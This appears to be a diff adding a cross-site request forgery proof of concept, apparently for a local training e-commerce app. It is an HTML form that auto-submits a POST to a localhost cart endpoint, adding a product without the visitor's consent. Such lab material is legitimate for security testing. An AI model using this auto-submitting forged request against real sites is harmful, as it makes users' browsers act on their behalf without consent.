@@ -1,0 +1,23 @@
+﻿<html>
+    <form enctype="application/x-www-form-urlencoded" method="POST" action="http://localhost/secure_dvea/cart.php">
+        <table>
+            <tr>
+                <td>product_id</td>
+                <td><input type="text" value="2" name="product_id"></td>
+            </tr>
+            <tr>
+                <td>quantity</td>
+                <td><input type="text" value="8" name="quantity"></td>
+            </tr>
+            <tr>
+                <td>button</td>
+                <td><input type="submit" name="add_to_cart" value="Add to Cart"></td>
+            </tr>
+        </table>
+
+        <script>
+            document.forms[0].submit();
+        </script>
+    </form>
+
+</html>
